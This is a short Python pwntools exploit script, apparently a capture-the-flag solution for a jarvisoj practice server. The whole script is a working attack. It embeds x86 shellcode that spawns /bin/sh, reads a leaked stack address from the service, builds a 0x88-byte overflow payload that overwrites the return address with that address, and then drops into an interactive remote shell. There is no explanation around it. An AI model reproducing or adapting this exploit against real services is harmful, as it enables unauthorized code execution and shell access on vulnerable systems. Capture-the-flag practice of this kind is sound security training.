from pwn import *
shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"

HOST = 'pwn2.jarvisoj.com'
PORT = 9877

def PrettyTommy(ip,port):

        con = remote(ip,port)
        con.recv(12)
        addr = con.recv(10)
        print addr
        leak = p32(int(addr,16))
        con.recv()
        
        payload = shellcode + (0x88-len(shellcode)) * 'A' + leak + leak
        con.send(payload)
        con.interactive("\nshell# ")

PrettyTommy(HOST,PORT)
